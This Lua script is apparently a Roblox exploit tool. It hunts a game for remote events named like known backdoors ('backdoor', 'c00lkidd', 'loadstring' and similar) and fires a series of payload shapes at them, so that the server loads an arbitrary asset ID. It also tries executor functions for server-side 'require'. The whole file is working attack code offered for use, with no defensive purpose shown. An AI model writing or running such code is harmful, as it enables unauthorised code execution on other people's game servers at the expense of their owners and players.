local BACKDOOR_NAMES = {
    "remote","mainevent","backdoor","backd00r","ss","serverside",
    "serverevent","serverscript","kohl","c00lkidd","c00lkid","lalol",
    "anti","ping","checkping","dataevent","mainremote","command","cmds",
    "adminremote","execute","exec","loader","loadstring","run","fire",
    "loadrequire","require","module","serverreq","invoke","callserver",
}

local PAYLOAD_SHAPES = {
    function(t) return {"require", t} end,
    function(t) return {"load", t} end,
    function(t) return {"script", t} end,
    function(t) return {t} end,
    function(t) return {"exec", t} end,
    function(t) return {"run", t} end,
    function(t) return {"executerequire", t} end,
    function(t) return {"req", t} end,
    function(t) return {"module", t} end,
    function(t) return {"loadrequire", t} end,
}

local function findBackdoor()
    if SS.backdoor and SS.backdoor.Parent then return SS.backdoor end
    SS.backdoor = nil
    for _, o in ipairs(game:GetDescendants()) do
        if o:IsA("RemoteEvent") or o:IsA("RemoteFunction") then
            local l = string.lower(o.Name)
            for _, n in ipairs(BACKDOOR_NAMES) do
                if l == n or string.find(l, n, 1, true) then
                    SS.backdoor = o; return o
                end
            end
        end
    end
    return nil
end

local function tryExecutorSS(target)
    local genv = rawget(_G, "getgenv")
    local env = type(genv) == "function" and genv() or _G
    for _, n in ipairs({"ssRequire","SSRequire","ServerRequire","ss_exec","execSS","ssExecute","SSExecute"}) do
        if type(env[n]) == "function" then
            if pcall(env[n], target) then return true, n end
        end
    end
    return false
end

local function fireSS(target)
    local rem = findBackdoor()
    if not rem then return false, "no backdoor remote" end
    for i, shape in ipairs(PAYLOAD_SHAPES) do
        local args = shape(target)
        local ok
        if rem:IsA("RemoteEvent") then
            ok = pcall(function() rem:FireServer(unpack(args)) end)
        else
            ok = pcall(function() rem:InvokeServer(unpack(args)) end)
        end
        if ok then
            SS.payloadShape = i
            return true, "via "..rem.Name.." (#"..i..")"
        end
    end
    return false, "payloads rejected"
end

local function ssRequire(assetId)
    if not SS.enabled then return false, "SS off" end
    local ok, name = tryExecutorSS(assetId)
    if ok then return true, "executor ("..tostring(name)..")" end
    return fireSS(assetId)
end

local function runSSModule(name)
    local entry = KNOWN_SS_MODULES[name]
    if not entry then return end
    SS.enabled = true
    task.spawn(function()
        local ok, err = ssRequire(entry.id)
        print("[SS] "..name.." ("..entry.id..") -> "..(ok and "OK " or "ERR ")..tostring(err))
    end)
end

